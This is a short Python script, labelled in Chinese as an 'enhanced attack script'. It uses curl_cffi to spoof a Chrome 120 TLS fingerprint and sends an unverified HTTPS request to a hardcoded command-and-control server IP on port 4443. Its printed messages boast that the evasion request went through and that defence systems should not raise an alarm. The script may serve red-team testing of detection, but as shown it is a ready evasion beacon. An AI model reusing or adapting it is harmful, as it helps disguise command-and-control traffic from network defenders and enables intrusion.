from curl_cffi import requests


def main() -> None:
    print("[*] 启动强化版攻击脚本...", flush=True)
    print("[*] 正在尝试伪装 TLS 指纹为: Chrome 120...", flush=True)

    # 请将 YOUR_C2_IP 修改为实际的 C2 服务器 IP（例如 10.122.216.44）
    C2_IP = "10.21.166.204"  # TODO: 修改为实际 C2 IP
    url = f"https://{C2_IP}:4443"

    try:
        resp = requests.get(
            url,
            impersonate="chrome120",
            verify=False,
            timeout=10,
        )
        print("[+] 逃逸攻击请求发送成功！(防御系统不应报警)", flush=True)
        print(f"[*] 响应状态码: {resp.status_code}", flush=True)
    except Exception as e:
        print(f"[!] 连接失败: {e}", flush=True)


if __name__ == "__main__":
    main()

